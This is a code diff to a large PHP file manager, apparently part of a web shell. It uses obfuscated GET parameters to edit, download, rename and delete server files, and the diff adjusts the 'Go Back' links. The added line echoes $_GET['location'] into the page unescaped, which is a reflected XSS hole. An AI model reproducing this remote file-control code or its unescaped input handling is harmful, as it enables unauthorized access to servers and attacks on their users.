@@ -2247,6 +2247,8 @@ else if(isset($_GET["zip"]))
 #Edits a File-->
 else if(isset($_GET["file"]))
 {
+	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a><br>";
+
 	if(isset($_POST["save"]))
 	{
 		if(is_writable(unxor_this($_GET["file"])))
@@ -2272,7 +2274,6 @@ else if(isset($_GET["file"]))
 		$file = unxor_this(htmlentities($_GET["file"]));
 		$content = file_get_contents(unxor_this($_GET["file"]));
 		echo "
-			<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($_GET['file']))."#File Manager'>Go Back</a><br>
 			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."#File Manager' method='POST'>
 				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
 				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
@@ -2533,8 +2534,8 @@ else
 							if ((is_readable($topdir)) && (is_writeable($topdir)))
 							{
 								echo "
-								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
-							}							
+								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
+							}				
 							else if (is_readable($topdir))
 							{
 								echo "
